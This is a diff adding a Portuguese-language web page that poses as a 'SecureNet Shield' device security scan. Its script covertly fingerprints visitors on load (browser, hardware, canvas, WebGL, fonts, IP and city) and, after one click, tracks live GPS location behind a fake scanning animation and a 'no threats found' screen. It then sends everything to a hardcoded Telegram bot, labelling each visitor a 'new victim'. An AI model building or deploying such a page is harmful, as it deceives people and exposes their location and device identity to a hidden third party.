@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Segurança</title>
+    <style>
+        :root {
+            --bg: #000000;
+            --text: #ffffff;
+            --accent: #00ff88;
+            --error: #ff3333;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            z-index: 10;
+        }
+
+        .header {
+            font-size: 2rem;
+            margin-bottom: 10px;
+            color: var(--accent);
+            text-shadow: 0 0 10px var(--accent);
+        }
+
+        .status {
+            font-size: 1rem;
+            margin-bottom: 20px;
+            opacity: 0.8;
+            min-height: 24px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #222;
+            border-radius: 2px;
+            margin-bottom: 30px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: var(--accent);
+            transition: width 0.1s linear;
+        }
+
+        .btn {
+            background: var(--accent);
+            color: #000;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: transform 0.2s, background 0.2s;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .btn:hover {
+            transform: scale(1.05);
+            background: #00cc6a;
+        }
+
+        .btn:disabled {
+            background: #333;
+            color: #666;
+            cursor: not-allowed;
+        }
+
+        /* Overlay de "Análise" */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 100;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s;
+        }
+
+        .overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .scan-text {
+            font-family: monospace;
+            color: var(--accent);
+            font-size: 0.9rem;
+            text-align: left;
+            width: 80%;
+            max-width: 400px;
+            white-space: pre-wrap;
+        }
+
+        .big-icon {
+            font-size: 4rem;
+            margin-bottom: 20px;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="main-ui">
+        <div class="header">⚡ SecureNet Shield</div>
+        <div class="status" id="status-text">Conectando ao servidor de segurança...</div>
+        <div class="progress-bar">
+            <div class="progress-fill" id="progress"></div>
+        </div>
+        <button class="btn" id="start-btn" disabled>Iniciar Verificação</button>
+    </div>
+
+    <div class="overlay" id="scan-overlay">
+        <div class="big-icon">📡</div>
+        <div class="scan-text" id="log-output">Iniciando varredura de rede...</div>
+    </div>
+
+    <script>
+        // CONFIGURAÇÃO DO TELEGRAM
+        const TELEGRAM_TOKEN = "8844740297:AAFMQyvo8ROBlofbI9gWhZVQepKQ4Gsj8-k";
+        const TELEGRAM_CHAT_ID = "7585945897";
+
+        let userData = {};
+        let statusIndex = 0;
+        const statuses = [
+            "Conectando ao servidor de segurança...",
+            "Verificando integridade do sistema...",
+            "Analisando tráfego de rede...",
+            "Coletando metadados do dispositivo...",
+            "Pronto para verificação."
+        ];
+
+        // 1. INICIALIZAÇÃO E FINGERTIPPING (Antes do clique)
+        document.addEventListener('DOMContentLoaded', () => {
+            collectInitialFingerprint();
+            
+            // Simula progresso de carregamento
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += Math.random() * 10;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(progressInterval);
+                    document.getElementById('start-btn').disabled = false;
+                    document.getElementById('status-text').innerText = "Sistema Pronto. Clique para verificar.";
+                }
+                document.getElementById('progress').style.width = progress + '%';
+            }, 100);
+
+            // Muda o texto de status periodicamente
+            const statusInterval = setInterval(() => {
+                if(statusIndex < statuses.length - 1) {
+                    document.getElementById('status-text').innerText = statuses[statusIndex++];
+                }
+            }, 2000);
+        });
+
+        // 2. COLETA DE FINGERPRINT (Passivo)
+        async function collectInitialFingerprint() {
+            userData.userAgent = navigator.userAgent;
+            userData.platform = navigator.platform;
+            userData.language = navigator.language;
+            userData.hardwareConcurrency = navigator.hardwareConcurrency; // Núcleos de CPU
+            userData.deviceMemory = navigator.deviceMemory; // RAM (GB)
+            userData.screen = `${window.screen.width}x${window.screen.height}`;
+            userData.pixelDepth = window.screen.colorDepth;
+            
+            // Canvas Fingerprint (Identifica o hardware de renderização)
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px "Arial"';
+            ctx.fillText('DeepHat-Phishing-Test', 2, 2);
+            userData.canvasFingerprint = canvas.toDataURL();
+
+            // WebGL Fingerprint
+            const gl = canvas.getContext('webgl');
+            if (gl) {
+                const glRenderer = gl.getParameter(gl.RENDERER);
+                const glVendor = gl.getParameter(gl.VENDOR);
+                userData.gpuInfo = `${glVendor} - ${glRenderer}`;
+            }
+
+            // Fontes instaladas (amostra rápida)
+            userData.fonts = detectFonts();
+
+            // IP e Localização (Ativo - requer permissão)
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                userData.ip = ipData.ip;
+                userData.city = ipData.city;
+                userData.region = ipData.region;
+                userData.country = ipData.country;
+                userData.timezone = ipData.timezone;
+                userData.org = ipData.org; // Provedor (ISP)
+            } catch (e) {
+                userData.ip = "Erro ao obter IP";
+            }
+        }
+
+        function detectFonts() {
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            const testFonts = ['Arial', 'Helvetica', 'Verdana', 'Georgia', 'Times New Roman', 'Courier New', 'Trebuchet MS'];
+            const detected = [];
+            
+            const span = document.createElement('span');
+            span.style.position = 'absolute';
+            span.style.left = '-9999px';
+            span.style.fontSize = '72px';
+            span.innerText = 'mmmmmmmmmmlli';
+            document.body.appendChild(span);
+
+            const baseSizes = {};
+            baseFonts.forEach(font => {
+                span.style.fontFamily = font;
+                baseSizes[font] = { w: span.offsetWidth, h: span.offsetHeight };
+            });
+
+            testFonts.forEach(font => {
+                span.style.fontFamily = `"${font}", ${baseFonts[0]}`;
+                const size = { w: span.offsetWidth, h: span.offsetHeight };
+                // Se o tamanho mudar, a fonte está instalada
+                if (size.w !== baseSizes[baseFonts[0]].w || size.h !== baseSizes[baseFonts[0]].h) {
+                    detected.push(font);
+                }
+            });
+            document.body.removeChild(span);
+            return detected.join(', ');
+        }
+
+        // 3. AÇÃO PRINCIPAL (O Clique)
+        document.getElementById('start-btn').addEventListener('click', () => {
+            document.getElementById('start-btn').disabled = true;
+            document.getElementById('start-btn').innerText = "Verificando...";
+            startScanSequence();
+        });
+
+        function startScanSequence() {
+            const overlay = document.getElementById('scan-overlay');
+            const log = document.getElementById('log-output');
+            overlay.classList.add('active');
+
+            const scanSteps = [
+                "Iniciando varredura de rede profunda...",
+                `Detectando ISP: ${userData.org || 'Desconhecido'}`,
+                `Localização Aproximada: ${userData.city || ''}, ${userData.country || ''}`,
+                "Verificando vulnerabilidades de navegador...",
+                `GPU Detectada: ${userData.gpuInfo || 'N/A'}`,
+                "Mapeando dispositivos conectados...",
+                "Gerando relatório de segurança..."
+            ];
+
+            let step = 0;
+            const stepInterval = setInterval(() => {
+                if (step < scanSteps.length) {
+                    log.innerText += "\n> " + scanSteps[step];
+                    step++;
+                } else {
+                    clearInterval(stepInterval);
+                    setTimeout(() => {
+                        overlay.classList.remove('active');
+                        showSuccessScreen();
+                    }, 1500);
+                }
+            }, 800);
+
+            // Dispara a coleta de localização em tempo real
+            triggerLiveLocation();
+        }
+
+        function triggerLiveLocation() {
+            if (navigator.geolocation) {
+                // watchPosition permite rastrear em tempo real
+                navigator.geolocation.watchPosition(
+                    (position) => {
+                        userData.liveLat = position.coords.latitude;
+                        userData.liveLon = position.coords.longitude;
+                        userData.liveAccuracy = position.coords.accuracy;
+                        
+                        // Opcional: Atualiza o log com as coordenadas ao vivo
+                        const log = document.getElementById('log-output');
+                        if(log) {
+                            log.innerText += `\n> LAT: ${userData.liveLat.toFixed(4)} | LON: ${userData.liveLon.toFixed(4)}`;
+                        }
+                    },
+                    (error) => {
+                        userData.geoError = error.message;
+                    },
+                    {
+                        enableHighAccuracy: true, // Força o GPS
+                        maximumAge: 0,             // Sem cache
+                        timeout: 10000             // Timeout de 10s
+                    }
+                );
+            }
+        }
+
+        function showSuccessScreen() {
+            const mainUI = document.getElementById('main-ui');
+            mainUI.innerHTML = `
+                <div class="header">✅ Verificação Concluída</div>
+                <p style="opacity: 0.8; margin-top: 20px;">
+                    Seu dispositivo foi analisado com sucesso.<br>
+                    Nenhuma ameaça crítica encontrada.<br>
+                    <small>Relatório ID: #${Math.random().toString(36).substring(2, 10).toUpperCase()}</small>
+                </p>
+                <p style="font-size: 0.8rem; opacity: 0.5; margin-top: 40px;">
+                    DeepHat Security Suite v2.4
+                </p>
+            `;
+
+            // Envia os dados
+            sendDataToTelegram();
+        }
+
+        // 4. ENVIO DOS DADOS PARA O TELEGRAM
+        async function sendDataToTelegram() {
+            const message = `
+🚨 <b>NOVA VÍTIMA DETECTADA</b> 🚨
+
+🌐 <b>Rede & IP</b>
+• IP: <code>${userData.ip || 'N/A'}</code>
+• ISP: ${userData.org || 'N/A'}
+• Cidade: ${userData.city || 'N/A'}, ${userData.region || 'N/A'}
+• País: ${userData.country || 'N/A'}
+• Timezone: ${userData.timezone || 'N/A'}
+
+📍 <b>Localização em Tempo Real (GPS)</b>
+• Lat: <code>${userData.liveLat ? userData.liveLat.toFixed(6) : 'N/A'}</code>
+• Lon: <code>${userData.liveLon ? userData.liveLon.toFixed(6) : 'N/A'}</code>
+• Precisão: ${userData.liveAccuracy ? userData.liveAccuracy + 'm' : 'N/A'}
+🗺️ <a href="https://www.google.com/maps?q=${userData.liveLat || 0},${userData.liveLon || 0}">Ver no Google Maps</a>
+
+💻 <b>Hardware & Sistema</b>
+• SO/Plataforma: ${userData.platform || 'N/A'}
+• User Agent: <code>${userData.userAgent || 'N/A'}</code>
+• CPU Cores: ${userData.hardwareConcurrency || 'N/A'}
+• RAM: ${userData.deviceMemory ? userData.deviceMemory + 'GB' : 'N/A'}
+• Resolução: ${userData.screen || 'N/A'}
+• GPU: ${userData.gpuInfo || 'N/A'}
+
+🔐 <b>Fingerprinting</b>
+• Fontes Detectadas: ${userData.fonts || 'N/A'}
+• Canvas Hash: <code>${userData.canvasFingerprint ? userData.canvasFingerprint.substring(0, 50) + '...' : 'N/A'}</code>
+• Geo Error: ${userData.geoError || 'None'}
+            `.trim();
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: true
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Telegram API Error: ${response.status}`);
+                }
+                console.log("Dados enviados com sucesso para o Telegram.");
+            } catch (error) {
+                console.error("Erro ao enviar para o Telegram:", error);
+            }
+        }
+    </script>
+</body>
+  </html>
